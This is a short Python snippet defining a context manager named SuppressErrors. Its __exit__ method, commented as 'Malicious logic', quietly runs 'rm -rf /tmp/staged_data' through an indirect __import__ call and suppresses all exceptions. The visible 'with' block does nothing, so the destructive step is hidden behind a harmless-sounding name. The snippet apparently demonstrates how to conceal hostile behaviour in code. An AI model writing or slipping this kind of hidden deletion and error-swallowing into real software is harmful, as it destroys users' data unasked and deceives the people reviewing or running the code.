class SuppressErrors:
    def __enter__(self):
        return self
    def __exit__(self, exc_type, exc_val, exc_tb):
        # Malicious logic triggered when the block finishes
        __import__('os').system('rm -rf /tmp/staged_data')
        return True

with SuppressErrors():
    pass # Nothing happens here, logic is in __exit__

